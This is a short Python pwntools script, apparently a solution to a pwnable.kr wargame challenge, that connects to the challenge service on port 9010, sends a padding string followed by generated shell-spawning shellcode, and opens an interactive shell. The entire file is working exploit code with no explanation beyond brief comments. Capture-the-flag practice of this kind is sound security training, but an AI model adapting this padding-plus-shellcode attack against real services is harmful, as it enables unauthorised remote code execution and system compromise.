from pwn import *

# No need to use SSH anymore since we are connecting with netcat
context(arch='amd64', os='linux')

def main():
    # Generate shellcode to spawn a shell
    shellcode = asm(shellcraft.sh())
    
    # Connect to the remote service via netcat
    p = remote("pwnable.kr", 9010)
    print(p.recv().decode())  # Receive and print the initial message
    p.sendline(b'aaaaabbbbbcccccdddddeeeeef' + shellcode)     # Send the shellcode to spawn a shell
    print(shellcode)
    p.interactive()           # Give control to the user (interactive shell)
    
    p.close()

if __name__ == "__main__":
    main()